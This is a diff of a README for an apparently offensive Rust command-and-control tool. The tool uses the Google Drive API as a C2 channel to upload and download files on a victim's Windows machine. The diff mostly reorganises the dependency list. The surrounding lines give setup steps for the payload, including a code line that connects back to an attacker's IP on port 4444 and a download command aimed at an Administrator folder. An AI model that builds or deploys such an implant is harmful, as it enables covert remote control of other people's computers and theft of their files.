@@ -19,6 +19,36 @@ Before compiling, on src/main.rs in payload folder, change this:
 - folder ID on ``` const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; ```
 - drop your json file in /src and put your json name in ```let service_account_json = include_str!("yourjsonfilename.json");```
 - your attacker's machine ip + port number at ```let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");```
+
+## Dependencies 📦
+
+This Rust project relies on the following dependencies:
+
+- **[yup-oauth2](https://crates.io/crates/yup-oauth2)**  
+  Handles authentication with Google OAuth2, allowing the C2 system to interact with Google Drive API using a Service Account.
+
+- **[reqwest](https://crates.io/crates/reqwest)**  
+  A popular HTTP client for Rust, used here for sending requests to the Google Drive API for file upload and download functionalities.
+
+- **[tokio](https://crates.io/crates/tokio)**  
+  An asynchronous runtime for Rust. It is required by some components of the project (like handling connections) to manage concurrency effectively.
+
+- **[serde](https://crates.io/crates/serde)**  
+  A framework for serializing and deserializing data structures in Rust. Essential for converting data to/from JSON format.
+
+- **[serde_json](https://crates.io/crates/serde_json)**  
+  A helper crate for `serde` to specifically handle JSON serialization and deserialization.
+
+- **[mime](https://crates.io/crates/mime)**  
+  Used for defining file types (MIME types) when uploading files to Google Drive via the API.
+
+### Installing Dependencies
+To install the necessary dependencies, simply include them in your `Cargo.toml`:
+
+Make sure to install these by running:
+```
+cargo build
+```
 # Compiling Rust payload
 To compile the Rust payload, follow these steps:
 ```
@@ -71,19 +101,7 @@ download;1vjkwFQJXMpVps5Zd2yD54syoXMEw98Fb;C:\Users\Administrator\Downloads\test
   <img alt="Logo" src="img/c2script.png" height="100%" width="100%">
 </p>
 
-Dependencies
-The Rust project uses the following dependencies:
-- yup-oauth2
-- reqwest
-- tokio
-- serde
-- serde_json
-- mime
 
-Make sure to install these by running:
-```
-cargo build
-```
 ## Inspiration & Acknowledgments 🙌
 This project was inspired by the amazing article "[Hacking Tutorial: Google Sheets Command and Control (C2) Server](https://maxlikessecurity.medium.com/hacking-tutorial-google-sheets-command-and-control-c2-server-999e4dbc89fc)" by Max Likes Security.
 
